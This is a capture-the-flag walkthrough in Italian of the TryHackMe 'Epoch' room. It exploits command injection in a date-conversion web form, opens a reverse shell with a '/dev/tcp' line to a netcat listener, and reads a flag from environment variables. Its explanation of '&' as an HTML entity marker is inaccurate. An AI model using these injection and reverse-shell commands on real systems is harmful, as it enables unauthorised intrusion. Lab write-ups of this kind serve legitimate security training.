
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/epoch

Siate onesti, avete  _sempre_  desiderato uno strumento online che vi aiutasse a convertire date e timestamp UNIX! Aspetta... non c'è bisogno che sia online, dite? Mi state dicendo che esiste un programma Linux da riga di comando che può già fare la stessa cosa? Beh, certo, lo sapevamo già! Il nostro sito web, in realtà, passa il vostro input direttamente a quel programma da riga di comando!

Dai un'occhiata a contenuti simili su TryHackMe:

- [Iniezione di comando](https://tryhackme.com/room/oscommandinjection)

andiamo su
http://10.10.134.18/

troviamo
```
### Epoch to UTC convertor
```

come da suggerimento si tratta di iniezione dei codice

immettiamo
```
ls
```
ma non funziona

proviamo con
**Inizio di un'entità**: Il carattere `&` viene utilizzato per iniziare un'entità di carattere, che è una rappresentazione di un carattere speciale che non può essere inserito direttamente nel codice HTML.

```
&ls
```

ed otteniamo

```
date: invalid date '@'
go.mod
go.sum
main
main.go
views
```

ora che sappiamo che funziona possiamo inviare un comando per ottenere la reverse shell

prima d'inviare ci mettiamo in ascolto sulla nostra macchina attaccante

```
nc -lvnp 443
```
inviamo il comando dal browser
```
&sh -i >& /dev/tcp/10.14.99.134/443 0>&1
```

otteniamo la reverse shell

```
└─# nc -lvnp 443
listening on [any] 443 ...
connect to [10.14.99.134] from (UNKNOWN) [10.10.134.18] 36958
sh: 0: can't access tty; job control turned off
$ whoami
challenge
$ ls -al                    
total 13772
drwxr-xr-x 1 root root     4096 Mar  2  2022 .
drwxr-xr-x 1 root root     4096 Mar  2  2022 ..
-rw-r--r-- 1 root root      220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 root root     3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 root root      807 Feb 25  2020 .profile
-rw-rw-r-- 1 root root      236 Mar  2  2022 go.mod
-rw-rw-r-- 1 root root    52843 Mar  2  2022 go.sum
-rwxr-xr-x 1 root root 14014363 Mar  2  2022 main
-rw-rw-r-- 1 root root     1164 Mar  2  2022 main.go
drwxrwxr-x 1 root root     4096 Mar  2  2022 views

```

non trovo niente di utile mostriamo il suggerimento di TryHackMe!

Questo è il suggerimento che stavi cercando: allo sviluppatore piace memorizzare i dati nelle variabili di ambiente. Riesci a trovare qualcosa di interessante?

vediamo le variabili d'ambiente con il seguente comando
```
printenv
```

```
$ printenv
HOSTNAME=e7c1352e71ec
SHLVL=1
HOME=/home/challenge
_=-al
PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PWD=/home/challenge
GOLANG_VERSION=1.15.7
FLAG=flag{xxxxxxxxx}

```
c'è la nostra flag!
